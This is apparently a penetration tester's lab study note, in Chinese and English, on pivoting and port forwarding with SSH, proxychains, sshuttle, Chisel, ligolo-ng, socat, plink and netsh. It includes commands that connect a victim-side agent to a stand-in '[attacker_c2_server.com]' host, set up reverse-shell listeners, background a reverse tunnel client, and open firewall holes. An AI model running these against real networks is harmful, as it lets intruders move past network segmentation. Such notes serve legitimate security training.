# Tunnling
## ssh
![[Pasted image 20240227200023.png|500]]
**需要可交互的TTY！**
由SSH服务器进行转发
### Local Port Forwording
```bash
ssh -N -L [LocalHost]:<localport>:<DestHost>:<DestPort> <sshServer_user>@<sshServerIP>
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
### Dynamic
```bash
ssh -N -D [LocalHost]:[LocalPort] <sshServer_User>@<sshServer_IP>
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
#### Proxychains[^1]
```bash
sudo vi /etc/proxychains4.conf 
#在末尾添加socks5(4) <ssh_client_IP> <port>
socks5 192.168.246.63 9999

proxychains4 <command...>
#proxychains4 nmap -Pn -sT -n -vvv 172.16.246.217
```
### Remote  Port Forwording
本地起SSH Deamon服务
远程主机访问本地的SSH服务器进行转发。
```bash
ssh -N -R <sshServer_IP/localhost>:<sshServer_IP_port>:<forward_IP>:<forward_port>  <sshServer_User>@<sshServer_IP>
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

#转发后的端口即可在本地(127.0.0.1)进行访问
```
### Remote Dynamic
```bash
ssh -N -R 9998 kali@192.168.118.4
tail /etc/proxychains4.conf #配置本地proxychains  ->> socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```
### Tool -- sshuttle
1. SSH客户端具有root权限
2. SSH服务器需要安装Python3
```bash
#DMZ
socat TCP-LISTEN:2222,fork TCP:<Next_pivot>:22
# ssh 登录到目标枢纽，建立路由，指定我们想要使用的SSH连接字符串，以及我们想要通过此连接进行隧道传输的子网（10.4.50.0/24和172.16.50.0/24）
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```
## Chisel
https://ap3x.github.io/posts/pivoting-with-chisel/
default port:1080
`cp $(which chisel) /var/www/html #or /tmp` 对于linux的目标主机，可以直接复制kali所使用的版本 
Kali:
```bash
chisel server --port 8080 --reverse
#sudo tcpdump -nvvvXi tun0 tcp port 8080 开启抓包
```
Linux:
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
# 创建隧道
#chisel.exe client <chisel_server_IP>:<server_Port> R:<Local_Port>:<Remote_Host>:<Remote_Port> 
chisel.exe client 192.168.119.5:8080 80:172.16.6.241:80
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80 
```
## ligolo
Release: https://github.com/nicocha30/ligolo-ng/releases
### Set up
   ![[Pasted image 20240422144031.png]]
   ```bash
   $ go build -o agent cmd/agent/main.go
   $ go build -o proxy cmd/proxy/main.go
   
   # Build for Windows
   #GOOS=windows go build -o agent.exe cmd/agent/main.go
   #GOOS=windows go build -o proxy.exe cmd/proxy/main.go
   
   sudo ip tuntap add user ikan mode tun ligolo
   sudo ip link set ligolo up
   ```
### Run
   ```bash
   $ ./proxy -h # Help options
   $ ./proxy -autocert # Automatically request LetsEncrypt certificates
   # in lab use -selfcert instead of -autocert
   
   #Add agent;Add Route
   session [session_number] # --> start
   
   sudo ip route add [192.168.0.0/24] dev ligolo #[subnet]
   ip route list #查看添加的路由
   
   sudo ip route add 10.10.199.0/24 dev ligolo
   ```
   ### Add Agent of Victim
   ```powershell
   #Download the agent.exe/agent.elf
    ./agent -connect [attacker_c2_server.com]:11601 -ignore-cert
   
   # Double Pivot
   listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601 #在代理机上执行
   ./agent2.exe -connect [c2_agent1_IP]:11601 -ignore-cert #agent2通过agent1中转
   #session 命令切换到新的会话，然后使用 start 在该连接上开始一个隧道。
   
   sudo ip route add 172.16.6.0/24 dev ligolo #添加新的子网
   ```
   ### Reverse Shell & File Upload
   ```bash
   listener_list
   
   #在当前的代理机执行操作
   listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 #Set up a listener for reverse shell
   listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000 #Set up a file Transfer port.
   ```
# PortForward
通过中继机器访问远程/不同子网下的服务；
## Socat
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432 
iptables #也可以创建转发
```
## Plink
将远程服务3389拉到本地端口的9983使用
```powershell
.\plink.exe -ssh -l <login> -pw <password> -R <ssh_server_Socket>:<ssh_client_Socket> <sshServer_IP>
.\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <Kali_IP>
```
No-tty Solution
```powershell
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```
## Netsh
受UAC限制&&需要管理员权限
将远程的2222拉到能直接访问主机192.168.50.64:2222上
Listen.port ---> connect.port
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

netstat -anp TCP | find "2222"
netsh interface portproxy show all
```
***
### 防火墙“凿洞”
防火墙只打开了80/3389端口，为了访问我们配置的2222端口，我们需要在防火墙上打一个洞。
**我们完成后还需要记得封住那个洞口！**
```powershell
#netsh advfirewall firewall子上下文 来创建这个端口。我们将使用add rule命令，并命名规则为"port_forward_ssh_2222"。稍后将使用这个名称来删除规则。
# Allow localport=2222 localip=192.168.50.64 'direction' dir=in -> 流量方向

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```
***
>***一旦我们完成连接，我们需要记得删除刚刚创建的防火墙规则。***
***
```powershell
#端口转发规则也可以被删除
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
